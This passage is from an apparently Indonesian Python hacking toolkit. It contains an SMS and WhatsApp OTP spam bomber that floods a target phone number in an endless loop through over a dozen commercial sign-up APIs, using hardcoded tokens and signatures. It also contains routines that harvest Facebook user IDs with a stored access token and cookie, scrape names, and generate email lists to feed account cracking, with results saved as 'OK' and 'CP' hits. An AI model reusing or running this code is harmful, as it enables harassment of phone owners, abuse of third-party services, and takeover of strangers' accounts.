					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
###------------------------------------------------------------------>
#     *SPAM WHATSAPP
###------------------------------------------------------------------>  
def spam_wa():
	global nomor
	cuih()
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
	

###------------------------------------------------------------------>
#     *PENGATURAN USERAGENT
###------------------------------------------------------------------>
def uatarg():
	kuntul = Tree(Panel.fit(f"""{P2}User Agent Sangat Berpengaruh Dalam Melakukan Crack Acount""",style=f"{color_panel}"),guide_style="bold grey100")
	kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}UserAgent {H2}Manual{P2}  [{M2}Not Recommended{P2}][/]\n{P2}[[bold cyan]02[/]{P2}][/] {P2}UserAgent {H2}Random{P2}  ( {M2}Saran{P2} )[/]',width=55,title=f"{H2}Input-UserAgent",style=f"{color_panel}"))
	prints(kuntul)
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);target()
	if juntzy in ['2','02']:
		ualuh.append('tidak');target()
def junxua():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);pilih_dulu()
	if juntzy in ['2','02']:
		ualuh.append('tidak');pilih_dulu()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
def uafile():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['3','03']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		ualu.append(uamu)
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree);setting()
	if juntzy in ['4','04']:
		ualuh.append('tidak');setting()
	if juntzy in ['2','02']:
		ualuh.append('wind');setting()
	if juntzy in ['1','01']:
		ualuh.append('linux');setting()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
def uanama():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);error()
	if juntzy in ['2','02']:
		ualuh.append('tidak');error()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
def uaflw():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);penggikut()
	if juntzy in ['2','02']:
		ualuh.append('tidak');penggikut()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
def uaemail():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);crack_email()
	if juntzy in ['2','02']:
		ualuh.append('tidak');crack_email()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
def uanama():
	juntzy = input(f'     └──>{h} Pilih UserAgent :{x} ')
	if juntzy in ['1','01']:
		ualuh.append('ya')
		print("")
		uamu = input(f'└──>{h} Your UserAgent : \n\033[32m')
		tree = Tree(Panel.fit(f"""{H2}{uamu}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ualu.append(uamu);crack_nama()
	if juntzy in ['2','02']:
		ualuh.append('tidak');crack_nama()
	else:
		print("╰─ > Minimal Pilih Yang Benar Kuntul");exit()
###------------------------------------------------------------------>
#     *CRACK IDZ PUBLIK
###------------------------------------------------------------------>
def pilih_dulu():
	sayy =Tree(Panel.fit(f"""{P2}      Pilih{H2} T{P2} Jika Mau Dump Idz Tunggal      """,style=f"{color_panel}"),guide_style="bold grey100")
	sayy.add(Panel.fit(f'{P2}Apakah Anda Mau Dump Idz Massal.?',width=80,title=f"{H2}Crack-Idz",style=f"{color_panel}"))
	prints (sayy)
	ziza = input(f'     └──>{h} Y/t? :{x} ')
	if ziza in ('y','Y'):
		dump_massal()
	if ziza in ('t','T'):
		crack_saja()
	else:
		print("-> Pilih Yang Betul Yah..")
def dump_massal():    
 try:
  token = open('PANDA-X/tokenku.txt','r').read()
  cok = open('PANDA-X/cokiku.txt','r').read()
 except IOError:
     exit()
 try:
  cetak(Panel(f"""\t                  [bold white]Target Max [bold green]500[/] Idz Target""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
  cetak(Panel(f"""\t            [bold white]Berapa [bold green]Idz[/] Target Yang mau Di Dump?""",width=80,style=f"{color_panel}"))
  mulung = int(input(f'└──>{h} Jumlah Target? :{x} '))
 except ValueError:
     exit()
 if mulung<1 or mulung>500:
     exit()
 ses=requests.Session()
 semuaa = 0
 cetak(Panel(f"""{P2} Crack Idz Target Wilayah {H2}{kotaku}/Sekitarnya {P2}Untuk Pertama Kali""",width=80,style=f"{color_panel}"))
 cetak(Panel(f"""{P2} Masukan Idz Target, Pastikan Idz Target Bersifat Publik Dan Tidak Private""",width=80,style=f"{color_panel}"))
 for KOTG49H in range(mulung):
  semuaa+=1
  tree = Tree(Panel.fit(f"""[bold white] Masukan Idz Ke[bold yellow] {semuaa}[bold white]""",style=f"{color_panel}"),guide_style="bold grey100")
  prints(tree)
  Masukan = input(f'{P}└── > \033[32m' )
  uid.append(Masukan)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for xr in url['friends']['data']:
            try:
                woy = (xr['id']+'|'+xr['name'])
                #eit = (url.text['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       cekapk()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()
###------------------------------------------------------------------>
#     *CRACK TUNGGAL
###------------------------------------------------------------------>
def crack_saja():    
 try:
  token = open('PANDA-X/tokenku.txt','r').read()
  cok = open('PANDA-X/cokiku.txt','r').read()
 except IOError:
     exit()
 try:
  mulung = int('1')
 except ValueError:
     exit()
 if mulung<1 or mulung>1:
     exit()
 ses=requests.Session()
 semuaa = 0
 cetak(Panel(f"""{P2} Crack Idz Target Wilayah {H2}{kotaku}/Sekitarnya {P2}Untuk Pertama Kali""",width=80,style=f"{color_panel}"))
 cetak(Panel(f"""{P2} Masukan Idz Target, Pastikan Idz Target Bersifat Publik Dan Tidak Private""",width=80,style=f"{color_panel}"))
 for KOTG49H in range(mulung):
  semuaa+=1
  tree = Tree(Panel.fit(f"""[bold white] Masukan Idz Public[bold white]""",style=f"{color_panel}"),guide_style="bold grey100")
  prints(tree)
  Masukan = input(f'{P}└── > \033[32m' )
  uid.append(Masukan)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for xr in url['friends']['data']:
            try:
                woy = (xr['id']+'|'+xr['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       cekapk()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()
###------------------------------------------------------------------>
#     *CRACK DARI PENGGIKUT
###------------------------------------------------------------------>
def pengikut():
	try:
		token = open('PANDA-X/cokiku.txt','r').read()
		cok = open('PANDA-X/tokenku.txt','r').read()
	except IOError:
		cuih()
	ses = requests.Session()
	cetak(Panel(f"""\t               [bold white]Target Max [bold green]100[/] Idz Target""",width=80,style=f"{color_panel}"))
	akun = console.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─ > Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=80,style=f"{color_panel}"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()


###------------------------------------------------------------------>
#     *CRACK DARI USERNAME
###------------------------------------------------------------------>
def crack_nama():
	mulai()
	nama = []
	custom = [" rehan"," suka"," siska"," alwy"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","amat ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(nel('[red]Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan [green]5.000 [red]Username\n', subtitle="╭────[white][[blue]INPUT-NAME[white]][blue]", subtitle_align="left",padding=(0,5),style=f"{color_panel}"))
	nam = console.input(f'   ╰─ > ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
###------------------------------------------------------------------>
#     *CRACK DARI EMAIL
###------------------------------------------------------------------>
def crack_email():
	mulai()
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel('[red]Masukan Nama Email Yang Ingin Di Crack, Contoh : Jun, Alvino, Brayen, Stenly', subtitle="╭────[white][[blue]INPUT-NAME[white]][blue]", subtitle_align="left",padding=(0,5),style=f"bold blue"))
	nama = console.input(f'   ╰─ > Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel('[red]Masukan Nama Domain , Contoh : @ms.com, @Gmail.com, @Yahoo.com, Dll', subtitle="╭────[white][[blue]INPUT-DOMAIN[white]][blue]", subtitle_align="left",padding=(0,5),style=f"bold blue"))
	doma = console.input(f'   ╰─ > Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	
	jumlah = console.input(f' [+] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
		
###------------------------------------------------------------------>
#     *CRACK DARI FILE
###------------------------------------------------------------------>
def crack_file():
	try:vin = os.listdir('/sdcard/JUNZ-DUMP')
	except FileNotFoundError:
		haecerjoin_tm(' ╰─ > Folder JUNZ-DUMP Tidak Di Temukan..! ');time.sleep(2);back()
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		tree = Tree(Panel.fit(f"""{P2}[{tulisan}●{P2}] Kamu Tidak Memiliki File Dump,
{P2}[{tulisan}●{P2}] Untuk Mengunakan Fitur Nomor 4 ini
{P2}[{tulisan}●{P2}] Dump Idz Terlebih Dahulu
{P2}[{tulisan}●{P2}] Masukan File Idz Yg Sudah Di Dump
{P2}[{tulisan}●{P2}] Ke Folder JUNZ-DUMP Di Penyimpanan
{P2}[{tulisan}●{P2}] Internal Kamu, Semoga Kamu Mengerti..!""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(tree)
		ms = input('╰─ > Kamu Mengerti Y/n ')
		if ms in ['']:
			print('╰─ > Minimal Bisa Ngetik Mek ')
		elif ms in ['y','Y']:
			haecerjoin_tm('╰─ > Thanks Sudah Paham ');time.sleep(3);back()
		elif ms in ['n','N']:
			os.system("xdg-open https://wa.me/+6282196816220?text=Giaman+Ini+Crack+File+Mas??🗿");time.sleep(3);back()
		haecerjoin_tm(' ╰─ > File Dump Tidak Di Temukan..! ');time.sleep(2);back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/JUNZ-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				tree = Tree(Panel.fit(f'%s %s ->{H2} %s {P2}Idz'%(nom,isi,len(hem))))
				prints(tree)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('╰─ > %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('╰─ > Input File : ')
		try:geh = lol[geeh]
		except KeyError:
			print('╰─ > Minimal Bisa Ngetik Mek ')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/JUNZ-DUMP/'+geh,'r').read().splitlines()
		except:
			haecerjoin_tm(' ╰─ > File Dump Tidak Di Temukan..! ');time.sleep(2);back()
		for xid in lin:
			id.append(xid)
		kuntul = Tree(Panel.fit(f"""{P2}User Agent Sangat Berpengaruh Dalam Melakukan Crack Acount""",style=f"{color_panel}"),guide_style="bold grey100")
		kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}UserAgent {H2}Manual{P2}  [{M2}Not Recommended{P2}][/]\n{P2}[[bold cyan]02[/]{P2}][/] {P2}UserAgent {H2}Random{P2}  ( {M2}Saran{P2} )[/]',width=55,title=f"{H2}Input-UserAgent",style=f"{color_panel}"))
		prints(kuntul);uafile()
###------------------------------------------------------------------>
#     *CEK HASIL CRACK
###------------------------------------------------------------------>
def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Keluar[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"{color_panel}"))
	kz = input(f' [+] Pilih : ')
	if kz in ['3','03']:
		exit()
	if kz in ['2','02']:
		try:vin = os.listdir('PANDA-X/result-cp')
		except FileNotFoundError:
			cetak(nel('[red]Tidak Ada File [white]'))
			time.sleep(3)
			exit()
		if len(vin)==0:
			cetak(nel('[red]Relust [yellow]CP[red] tidak Ada [white]'))
			time.sleep(2)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('PANDA-X/result-cp/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
